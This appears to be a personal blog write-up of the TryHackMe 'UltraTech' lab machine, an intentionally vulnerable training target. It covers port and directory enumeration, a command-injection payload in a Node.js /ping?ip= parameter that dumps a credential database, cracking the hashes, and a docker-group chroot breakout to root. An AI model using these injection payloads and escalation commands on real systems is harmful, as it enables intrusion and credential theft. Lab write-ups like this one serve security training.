---
title: "TryHackMe - UltraTech"
author: Nasrallah
description: ""
date: 2022-09-25 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium, docker, cracking, js, rce]
img_path: /assets/img/tryhackme/ultratech
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [UltraTech](https://tryhackme.com/room/ultratech1) from [TryHackMe](https://tryhackme.com). The machine is running a web server where we find a js file disclosing a way to run command on the target that leads to a foothold. Being part of docker group makes it easy to get root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.216.105
Host is up (0.093s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The scans shows 3 open ports, 22 running VSFTPD, 22 running OpenSSH and 8081 running Node.js.

If we run another nmap scan for all ports, it discovers another open ports

```terminal
31331/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

Port 31331 open running Apache web server.

### Web

Let's navigate to the node.js web page on port 8081.

![](1.png)

Nothing interesting, let's run a directory scan.

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.85.137:8081
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/28 05:36:33 Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
===============================================================

```

Found two directories but they don't give much information.

Let's go the the web page on port 31331.

![](2.png)

Let's run a directory scan.

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.85.137:31331
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/28 06:02:40 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 299]
/.htpasswd            (Status: 403) [Size: 299]
/css                  (Status: 301) [Size: 319] [--> http://10.10.85.137:31331/css/]
/favicon.ico          (Status: 200) [Size: 15086]                                   
/images               (Status: 301) [Size: 322] [--> http://10.10.85.137:31331/images/]
/javascript           (Status: 301) [Size: 326] [--> http://10.10.85.137:31331/javascript/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.85.137:31331/js/]        
/robots.txt           (Status: 200) [Size: 53]                                             
/server-status        (Status: 403) [Size: 303]                                            
===============================================================
```

Let's check `robots.txt`.

![](3.png)

Let's see what's on the text file.

![](4.png)

Found a couple of html file but they are not very useful to us.

Checking other directories we found with gobuster we find the following.

![](5.png)

The api.js file has the following.

```js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();

```

According to the js file, we can execute command on `http://{APIURL}:8081/ping?ip={command}`

## **Foothold**

Let's test this functionality by running the command `id` for example:

```text
http://10.10.216.105:8081/ping?ip=`id`
```

![](6.png)

We have command execution on the target.

When we run the `ls`, we get this.

```terminal
┌──(sirius㉿kali)-[~]
└─$ curl 'http://10.10.216.105:8081/ping?ip=`ls`'                   
ping: utech.db.sqlite: Name or service not known
                                                                                                                                                             
┌──(sirius㉿kali)-[~]
└─$ curl 'http://10.10.216.105:8081/ping?ip=`cat%20utech.db.sqlite`'
���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
                      
```

We found a file with some hashes in it. We can crack them using [crackstation](https://crackstation.net/)

![](7.png)

Got the password for `r00t`, let's login with ssh.

![](8.png)

## **Privilege Escalation**

When we run the command `id`, we get this:

```terminal
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

We are part of `docker` group. Let's go to [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell)

![](9.png)

We can run `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` to get root.

![](11.png)

There is no image called alpine.

Let's list the docker process with `docker ps -a` and replace **alpine** with the image we find in the process.

![](10.png)

Great! We got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
